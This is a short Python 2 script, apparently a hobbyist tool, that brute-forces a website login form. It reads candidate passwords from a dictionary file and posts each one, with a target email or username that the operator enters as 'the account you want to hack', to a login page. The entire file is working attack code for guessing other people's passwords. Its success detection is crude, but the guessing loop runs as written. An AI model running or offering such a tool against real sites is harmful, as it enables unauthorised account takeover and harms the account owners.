#####################################
# Brute Force Login                 #
# Author Sanix Darker               #
# https://github.com/Sanix-Darker   #
#####################################

import requests

print "\n#####################################"
print "# Brute Force Login                 #"
print "# Author Sanix Darker               #"
print "# https://github.com/Sanix-Darker   #"
print "#####################################"

# The link of the website
url = 'https://www.example.com/login.php'

# The userfield in the form of the login
userField = 'email'

# The passwordfield in the form
passwordField = 'pass'

# The file contains per lines many possibilities of password
fakepass_db = open('dictionary.txt')
lines = fakepass_db.readlines()

print "Connecting to: "+url+"..."

# Put the target email you want to hack
user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")

failed_aftertry = 0
for line in lines:
    dados = {userField: user_email,
             passwordField: line}

    # Doing the post form
    data = requests.post(url, data=dados)

    #print data.text
    if "404 - Not Found" in data.text:
        if failed_aftertry > 4:
            break
        else:
            failed_aftertry = failed_aftertry+1
            print "Connexion failed : 404 Not Found (Verify your link)"
    else:
        if "incorrect" in data.text:
            print "Failed to connect :", line
        else:
            print "Trying this password :", line